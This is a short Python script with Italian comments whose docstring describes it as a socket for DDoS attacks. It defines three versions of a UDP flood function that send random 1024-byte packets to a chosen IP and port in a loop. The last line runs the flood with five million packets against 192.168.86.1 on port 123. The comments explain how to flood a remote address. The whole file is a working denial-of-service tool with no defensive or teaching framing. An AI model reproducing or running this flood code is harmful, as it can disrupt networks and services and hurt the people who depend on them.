#!/usr/bin/env python


"""
Creazione di un socket
per attacchi ddos
"""


import socket
import random


def udp_flood_v1(indirizzo_ip, numero_porta, numero_pacchetti):
    """ Creazione di un udp flood """
    data_to_send = random._urandom(1024)
    try:
        my_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except ConnectionError as error:
        print(error)
    except OSError:
        print("Non posso creare un socket ad un ip che non ho.")
    else:
        target = (indirizzo_ip, numero_porta)
        # Creando my_socket.bind possiamo dossare solo gli ip
        # presenti nel nostro pc

        # my_socket.bind((indirizzo_ip, numero_porta))

        # Usando my_socket.connect possiamo floodare
        # un ip remoto

        my_socket.connect((indirizzo_ip, numero_porta))
        print(f"Il target selezionato è: {target}")
        for x in range(0, numero_pacchetti):
            my_socket.sendto(data_to_send, target)
            print(f"N:{x} - UDP inviati")
        my_socket.close()



def udp_flood_v2(indirizzo_ip, numero_porta, numero_pacchetti):
    """ Creazione di un udp flood """
    data_to_send = random._urandom(1024)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as my_socket:
        target = ((indirizzo_ip, numero_porta))
        my_socket.connect(target)
        print(f"Il target selezionato è: {target}")
        for x in range(0, numero_pacchetti):
            my_socket.sendto(data_to_send, target)
            print(f"N:{x} - UDP inviati")


def udp_flood_v3(indirizzo_ip, numero_porta, numero_pacchetti):
    """ Creazione di un udp flood """
    data_to_send = random._urandom(1024)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as my_socket:
        try:
            target = ((indirizzo_ip, numero_porta))
            my_socket.connect(target)
        except OSError:
            print("OS Error.")
        else:
            print(f"Il target selezionato è: {target}")
            for x in range(0, numero_pacchetti):
                try:
                    my_socket.sendto(data_to_send, target)
                except ConnectionRefusedError:
                    print("Connessione Rifiutata.")
                else:
                    print(f"N:{x} - UDP inviati")


#udp_flood_v1("192.168.86.32", 5555, 50000)
udp_flood_v3("192.168.86.1", 123, 5000000)
